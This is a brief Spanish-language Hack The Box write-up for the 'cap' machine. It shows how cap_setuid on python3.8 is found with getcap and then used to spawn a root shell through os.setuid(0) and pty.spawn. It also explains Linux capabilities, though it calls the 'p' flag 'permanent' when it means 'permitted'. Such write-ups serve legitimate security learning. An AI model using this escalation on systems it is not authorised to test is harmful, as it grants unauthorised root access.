### Local enumeration

- getcap -r

### Atack vector

- cap_setuid on python3.8


---
En Linux, **`CAP_SETUID`** es una de las capacidades del sistema de control de privilegios (capabilities). Esta capacidad permite a un proceso cambiar su identificador de usuario (UID) o de grupo (GID). Esto es normalmente una operación restringida al superusuario (root), pero al asignar la capacidad `CAP_SETUID` a un binario, un proceso puede cambiar su UID sin necesidad de ser ejecutado por el usuario root.


para activarlo en un sistema linux seria 
```bash
sudo setcap cap_setuid=eip /ruta/al/binario
```

En el equipo cap.htb observamos que python3.8 tiene habilitado el cap_setuid 
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Cuando ves la salida de `getcap`, puedes interpretar lo siguiente:

- `cap_setuid`: Esta es la capacidad que se ha asignado al binario.
- `ep`: Significa que la capacidad es efectiva (e) y de tipo "permanent" (p), es decir, que está presente y se mantiene en la ejecución del binario.
---


# exploit

Vamos a probar a spawnear una rootshell en python:
```python
nathan@cap:~$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> import os
>>> os.setuid(0)
>>> pty.spawn("bash")
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

#Rooted 

